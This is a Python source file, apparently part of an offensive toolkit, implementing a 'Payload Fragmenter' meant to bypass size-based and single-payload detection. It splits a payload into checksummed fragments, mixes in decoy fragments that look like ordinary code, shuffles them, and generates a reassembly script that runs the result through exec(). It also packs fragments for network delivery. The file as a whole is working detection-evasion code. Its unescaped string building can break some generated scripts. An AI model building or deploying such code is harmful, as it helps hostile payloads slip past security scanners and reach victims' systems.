"""
Payload Fragmenter
Bypasses: Size-based detection, single-payload analysis
Technique: Split payloads into multiple fragments with reassembly
"""

import random
import string

class Fragmenter:
    def __init__(self):
        self.fragment_size = 20
        self.randomize_order = True
        self.add_decoys = True
    
    def randomize(self):
        """Randomize fragmentation parameters"""
        self.fragment_size = random.randint(15, 35)
        self.randomize_order = random.choice([True, False])
        self.add_decoys = random.choice([True, False])
    
    def encode(self, payload):
        """Fragment payload into multiple parts"""
        if isinstance(payload, bytes):
            payload = payload.decode('utf-8')
        
        # Split into fragments
        fragments = []
        for i in range(0, len(payload), self.fragment_size):
            fragment = payload[i:i + self.fragment_size]
            fragments.append({
                'id': len(fragments),
                'data': fragment,
                'checksum': self._simple_checksum(fragment)
            })
        
        # Add decoy fragments
        if self.add_decoys:
            decoy_count = random.randint(1, 3)
            for _ in range(decoy_count):
                decoy_data = self._generate_decoy()
                fragments.append({
                    'id': -1,  # Mark as decoy
                    'data': decoy_data,
                    'checksum': self._simple_checksum(decoy_data)
                })
        
        # Randomize order
        if self.randomize_order:
            random.shuffle(fragments)
        
        # Create reassembly script
        reassembly_script = self._generate_reassembly_script(fragments)
        
        return reassembly_script
    
    def _simple_checksum(self, data):
        """Generate simple checksum for fragment validation"""
        return sum(ord(c) for c in data) % 256
    
    def _generate_decoy(self):
        """Generate decoy fragment data"""
        decoy_templates = [
            "echo 'System check...'",
            "# Configuration loaded",
            "import os, sys",
            "// Debug information",
            "var config = {};",
        ]
        
        base = random.choice(decoy_templates)
        # Add some random padding
        padding = ''.join(random.choices(string.ascii_letters, k=random.randint(5, 15)))
        return f"{base} // {padding}"
    
    def _generate_reassembly_script(self, fragments):
        """Generate script to reassemble fragments"""
        # Separate real fragments from decoys
        real_fragments = [f for f in fragments if f['id'] != -1]
        real_fragments.sort(key=lambda x: x['id'])  # Sort by original order
        
        # Create Python reassembly script
        script = "# Fragment reassembly\n"
        script += "fragments = [\n"
        
        for fragment in fragments:
            script += f"    {{'id': {fragment['id']}, 'data': '{fragment['data']}', 'checksum': {fragment['checksum']}}},\n"
        
        script += "]\n\n"
        script += """
# Reassemble payload
def reassemble():
    real_frags = [f for f in fragments if f['id'] != -1]
    real_frags.sort(key=lambda x: x['id'])
    
    payload = ''
    for frag in real_frags:
        # Verify checksum
        expected = sum(ord(c) for c in frag['data']) % 256
        if frag['checksum'] == expected:
            payload += frag['data']
    
    return payload

# Execute reassembled payload
exec(reassemble())
"""
        return script
    
    def encode_network_fragments(self, payload):
        """Create network-deliverable fragments"""
        if isinstance(payload, bytes):
            payload = payload.decode('utf-8')
        
        fragments = []
        fragment_id = random.randint(1000, 9999)
        
        for i in range(0, len(payload), self.fragment_size):
            fragment = payload[i:i + self.fragment_size]
            
            # Create network packet-like structure
            packet = {
                'session_id': fragment_id,
                'sequence': i // self.fragment_size,
                'total_fragments': (len(payload) + self.fragment_size - 1) // self.fragment_size,
                'data': fragment,
                'timestamp': random.randint(1600000000, 1700000000)
            }
            
            fragments.append(packet)
        
        return fragments